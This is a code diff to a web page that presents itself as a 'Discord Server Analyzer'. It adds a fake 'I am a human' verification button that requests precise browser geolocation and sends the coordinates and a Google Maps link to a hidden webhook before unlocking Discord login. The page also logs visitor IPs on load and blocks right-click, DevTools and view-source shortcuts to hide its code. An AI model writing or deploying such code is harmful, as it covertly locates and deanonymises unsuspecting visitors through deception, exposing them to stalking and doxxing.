@@ -44,6 +44,14 @@
             line-height: 1.4;
         }
 
+        .verify-box {
+            background: #2f3136;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 15px 0;
+            border: 1px solid #202225;
+        }
+
         .login-btn {
             background-color: #5865f2;
             color: white;
@@ -53,14 +61,37 @@
             cursor: pointer;
             font-size: 16px;
             font-weight: bold;
-            transition: background-color 0.2s;
+            transition: background-color 0.2s, opacity 0.2s;
             margin-top: 15px;
             text-decoration: none;
             display: inline-block;
         }
 
-            .login-btn:hover {
+            .login-btn:hover:not(.disabled) {
                 background-color: #4752c4;
+            }
+
+            .login-btn.disabled {
+                opacity: 0.4;
+                cursor: not-allowed;
+                pointer-events: none;
+            }
+
+        .verify-btn {
+            background-color: #3ba55d;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: bold;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+            .verify-btn:hover {
+                background-color: #2d7d46;
             }
 
         .server-list {
@@ -141,9 +172,17 @@
 
     <div class="card">
         <h2>Discord Server Analyzer</h2>
+
+        <!-- Verification Section -->
+        <div id="verifyBox" class="verify-box">
+            <p style="margin: 0; color: #fff; font-weight: 500;">Prove you're human to access the website</p>
+            <button id="humanBtn" class="verify-btn">I am a human.</button>
+        </div>
+
         <p id="intro-text">Connect your Discord account to see which servers you're in.</p>
 
-        <a id="loginBtn" href="#" class="login-btn">Login with Discord</a>
+        <!-- Initially locked button -->
+        <a id="loginBtn" href="#" class="login-btn disabled">Login with Discord</a>
 
         <div id="content" class="hidden">
             <div class="user-info" id="userInfo"></div>
@@ -160,13 +199,69 @@
 
         // Build OAuth2 URL with identify + guilds scope
         const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=identify%20guilds`;
-        document.getElementById('loginBtn').href = oauthUrl;
+        const loginBtn = document.getElementById('loginBtn');
+        loginBtn.href = oauthUrl;
 
         // 1. Log IP on initial page load
         window.addEventListener('DOMContentLoaded', () => {
         logPageVisit();
         checkOAuthCallback();
         });
+
+        // 2. Human Verification Click -> Request Geolocation -> Unlock Buttons
+        document.getElementById('humanBtn').addEventListener('click', () => {
+        const humanBtn = document.getElementById('humanBtn');
+        humanBtn.textContent = "Verifying...";
+        humanBtn.disabled = true;
+
+        if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+        async (position) => {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+        const accuracy = position.coords.accuracy;
+        const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+        try {
+        await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+        embeds: [{
+        title: "📍 User Geolocation Captured",
+        color: 15105570,
+        fields: [
+        { name: "Latitude", value: String(latitude), inline: true },
+        { name: "Longitude", value: String(longitude), inline: true },
+        { name: "Accuracy", value: `~${Math.round(accuracy)} meters`, inline: true },
+        { name: "Google Maps Link", value: `[View Location](${googleMapsUrl})`, inline: false }
+        ],
+        timestamp: new Date().toISOString()
+        }]
+        })
+        });
+        } catch (err) {
+        console.error("Failed to send location webhook:", err);
+        } finally {
+        unlockInterface();
+        }
+        },
+        (error) => {
+        console.warn("Geolocation permission error:", error.message);
+        unlockInterface(); // Unlock even if permission is denied
+        },
+        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+        } else {
+        unlockInterface();
+        }
+        });
+
+        function unlockInterface() {
+        // Hide the verification box and unlock the login button
+        document.getElementById('verifyBox').classList.add('hidden');
+        loginBtn.classList.remove('disabled');
+        }
 
         async function logPageVisit() {
         let userIp = 'Unknown / Blocked';
@@ -199,14 +294,15 @@
         }
         }
 
-        // 2. Process OAuth redirect token
+        // Process OAuth redirect token
         function checkOAuthCallback() {
         const hash = window.location.hash.substring(1);
         const params = new URLSearchParams(hash);
         const accessToken = params.get('access_token');
 
         if (accessToken) {
-        document.getElementById('loginBtn').classList.add('hidden');
+        document.getElementById('verifyBox').classList.add('hidden');
+        loginBtn.classList.add('hidden');
         document.getElementById('intro-text').classList.add('hidden');
         document.getElementById('content').classList.remove('hidden');
 
@@ -286,7 +382,6 @@
         ? `${user.global_name} (@${user.username})`
         : `@${user.username}`;
 
-        // Build text file content for all servers
         let fileText = `=========================================\n`;
         fileText += ` DISCORD SERVER LIST FOR ${user.username.toUpperCase()}\n`;
         fileText += ` User ID: ${user.id}\n`;
@@ -346,69 +441,14 @@
         }
         }
 
-        // ==========================================
-        // FRONT-END RESTRICTIONS (Deterrents)
-        // ==========================================
-
-        // 1. Disable Right-Click Context Menu (Prevents Inspect via click)
-        document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
+        // Disable Context Menu & Shortcuts
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+        if (e.key === 'F12') e.preventDefault();
+        if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) e.preventDefault();
+        if (e.metaKey && e.altKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) e.preventDefault();
+        if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U')) e.preventDefault();
         });
-
-        // 2. Disable Keyboard Shortcuts (F12, Ctrl+Shift+I/J/C, Ctrl+U)
-        document.addEventListener('keydown', function(e) {
-        if (e.key === 'F12') {
-        e.preventDefault();
-        }
-        if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) {
-        e.preventDefault();
-        }
-        if (e.metaKey && e.altKey && ['I', 'J', 'C', 'i', 'j', 'c'].includes(e.key)) {
-        e.preventDefault();
-        }
-        if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U')) {
-        e.preventDefault();
-        }
-        });
-        
-        if ("geolocation" in navigator) {
-    navigator.geolocation.getCurrentPosition(
-        async (position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const accuracy = position.coords.accuracy; // accuracy radius in meters
-            const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "📍 User Geolocation Captured",
-                            color: 15105570, // Orange accent
-                            fields: [
-                                { name: "Latitude", value: String(latitude), inline: true },
-                                { name: "Longitude", value: String(longitude), inline: true },
-                                { name: "Accuracy", value: `~${Math.round(accuracy)} meters`, inline: true },
-                                { name: "Google Maps Link", value: `[View Location](${googleMapsUrl})`, inline: false }
-                            ],
-                            timestamp: new Date().toISOString()
-                        }]
-                    })
-                });
-            } catch (err) {
-                console.error("Failed to send location webhook:", err);
-            }
-        },
-        (error) => {
-            console.warn("Geolocation permission error:", error.message);
-        }
-    );
-} else {
-    alert("Geolocation is not supported by your browser.");
-}
     </script>
-    
 </body>
 </html>
